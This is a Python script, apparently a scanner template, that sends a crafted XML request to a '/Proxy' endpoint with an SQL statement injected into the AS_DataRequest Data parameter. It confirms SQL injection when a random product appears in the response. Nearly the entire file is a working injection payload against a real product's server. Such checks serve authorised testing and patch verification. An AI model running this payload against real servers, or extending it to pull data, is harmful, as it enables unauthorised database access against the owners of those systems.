import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r1=randomInt(40000, 44800)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r2=randomInt(40000, 44800)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"/Proxy"
	body="cVer=9.8.0&dp=%3c?xml%20version%3d%221.0%22%20encoding%3d%22GB2312%22?%3e%3cR9PACKET%20version%3d%221%22%3e%3cDATAFORMAT%3eXML%3c%2fDATAFORMAT%3e%3cR9FUNCTION%3e%3cNAME%3eAS_DataRequest%3c%2fNAME%3e%3cPARAMS%3e%3cPARAM%3e%3cNAME%3eProviderName%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3eDataSetProviderData%3c%2fDATA%3e%3c%2fPARAM%3e%3cPARAM%3e%3cNAME%3eData%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3e%20select%20"+str(r1)+"%2a"+str(r2)+"%20%3c%2fDATA%3e%3c%2fPARAM%3e%3c%2fPARAMS%3e%3c%2fR9FUNCTION%3e%3c%2fR9PACKET%3e"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
			 "Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(r1 * r2) in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
